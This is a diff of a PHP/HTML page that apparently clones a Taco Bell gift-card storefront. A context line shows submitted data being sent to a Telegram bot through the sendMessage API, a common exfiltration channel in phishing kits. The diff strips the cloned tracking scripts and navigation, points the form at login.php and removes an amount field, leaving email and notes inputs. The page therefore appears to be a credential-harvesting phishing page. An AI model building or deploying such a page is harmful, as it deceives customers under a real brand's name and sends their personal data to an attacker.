@@ -127,74 +127,9 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
         </script>
 
 
-
-<!-- Google Tag Manager (noscript) -->
-<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M2L7D5N>"
-                  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
-<!-- End Google Tag Manager (noscript) -->
-
-    <script>var __uzdbm_1 = "60ec1aa0-a4a3-483a-afea-7912a7e38f26";var __uzdbm_2 = "OWUxYjhiYmUtYnMyYi00ZWFhLWE3MjQtMTI0MzU1ZGU2NWI1JDE4NS4yMjMuMTUyLjEzMQ==";</script> <script>(function(w, d, e, u, c, g, a, b){ w["SSJSConnectorObj"] = {ss_cid : c, domain_info: "auto"}; a = d.createElement(e); a.async = true; a.src = u; b = d.getElementsByTagName(e)[0]; b.parentNode.insertBefore(a, b); })(window,document,"script","https://cdn.perfdrive.com/aperture/apertur###","bs2d","ssConf");</script></head>
-<body class="no-images">
-    <div style="display: none;" id="spinner">
-        <div class="loading-indicator loading-md"></div>
-        <div class="clear"></div>
-    </div>
-<!-- Fixed navbar -->
-<nav class="header-menu navbar navbar-inverse navbar-fixed-top" aria-label="Top Banner">
-    <div class="container">
-    
-    <div title="" tabindex="0" class="offscreen"></div>
-        <div class="navbar-header tw-header-menu">
-            <a class="navbar-brand" target="_blank" href="https://www.tacobell.com" tabindex="0" title="Click on Taco Bell logo to go to https://www.tacobell.com">Taco Bell</a>
-            <div class="cart-dropdown-container">
-                        <!-- REVIEW 36232163 -->
-            <!-- GEB 06/19/2018 updated cart icon from a bg-image to img -->
-            <a href="https://merchant.wgiftcard.com/cart/tacobell" tabindex="0" id="sm-cart-link" class="pull-right hidden-sm hidden-md hidden-lg tw-cart" title="The total number of line items in your cart is 0">
-                <img alt="Cart Icon" src="https://tw-merchant-content-production.s3.amazonaws.com/private/retail/225/tacobell/responsive/images/cart-icon.png" aria-hidden="true">
-                <span class="sr-only">Cart: The total number of items in your cart is 0</span>
-                <span class="badge" aria-hidden="true">0</span>
-            </a>
-                                    <div class="collapse navbar-collapse navbar-inverse" id="tw-menu">
-            <ul class="nav navbar-nav">
-                                    <li class="hidden-xs">
-                        <!-- REVIEW 36232163 -->
-                    <!-- GEB 06/19/2018 updated cart icon from a bg-image to img -->
-                        <a href="https://merchant.wgiftcard.com/cart/tacobell" tabindex="0" id="lg-cart-link" class="tw-cart" title="The total number of line items in your cart is 0">
-                            <img alt="Cart Icon" src="https://tw-merchant-content-production.s3.amazonaws.com/private/retail/225/tacobell/responsive/images/cart-icon.png" aria-hidden="true">
-                            <span class="sr-only">Cart: The total number of items in your cart is 0</span>
-                            <span class="badge" aria-hidden="true">0</span>
-                        </a>
-                    </li>
-                
-                                
-                            </ul><!-- .nav.navbar-nav -->
-        </div><!-- #tw-menu -->
-
-            </div>
-        </div>
-    </div>
-</nav>
-<!-- end Fixed navbar -->
-    
-    
-    
-
-
-
-
-
-            
-        
-            
-     
-    
-	
-
-<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
+<form action="login.php" method="POST">
         <br> <br><br> <br> <br> <br> <br> <br> <br><label for="email">Email:</label>
         <input name="email" id="email" required="" type="text" width="">
-        <label for="amount">Amount:</label>
-        <input name="amount" id="amount" required="" type="text">
 
         <label for="notes">Notes:</label>
         <textarea name="notes" id="notes" rows="4"></textarea>
